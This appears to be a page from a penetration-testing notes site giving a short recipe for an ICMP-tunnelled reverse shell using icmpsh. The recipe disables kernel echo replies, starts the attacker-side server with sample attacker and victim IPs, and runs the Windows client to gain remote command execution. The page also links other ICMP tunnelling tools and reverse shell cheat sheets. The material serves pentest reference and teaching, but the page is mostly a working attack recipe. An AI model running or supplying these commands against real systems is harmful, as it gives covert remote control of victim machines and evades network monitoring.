---
layout: page
title: "# Reverse Shells"
permalink: /shell/reverse_shells/
---

# Reverse Shells

```bash
#Download ICMPSH:
https://github.com/bdamele/icmpsh
#Examples:
https://www.cynet.com/attack-techniques-hands-on/how-hackers-use-icmp-tunneling-to-own-your-network/
#Attacker:
#Before running icmpsh, we will need to prevent the kernel from replying to ICMP echo requests. Most ICMP tunneling tools will implement mechanisms to synchronize the data stream between the two machines, and the kernel replies may cause unexpected results.
#Add to: /etc/sysctl.conf
net.ipv4.icmp_echo_ignore_all=1
#Reload the settings:
sudo sysctl --system
#Run Server
#sudo ./icmpsh_m.py %ATTACKERIP% %VICTIMIP% <- The Victim IP waits for ICMP Requests from the server
sudo ./icmpsh_m.py 192.168.178.178 192.168.178.100
#Run Client (Windows:
icmpsh.exe -t 192.168.178.178
#A reverse shell is made and RCE is possible. Note - this traffic is NOT encrypted!

ICMPTunnel:
https://github.com/DhavalKapil/icmptunnel

PTunnelNG:
https://github.com/lnslbrty/ptunnel-ng

```

## Other Resources:

- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology and Resources/Reverse Shell Cheatsheet.md#bash-tcp](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#bash-tcp)
- [http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
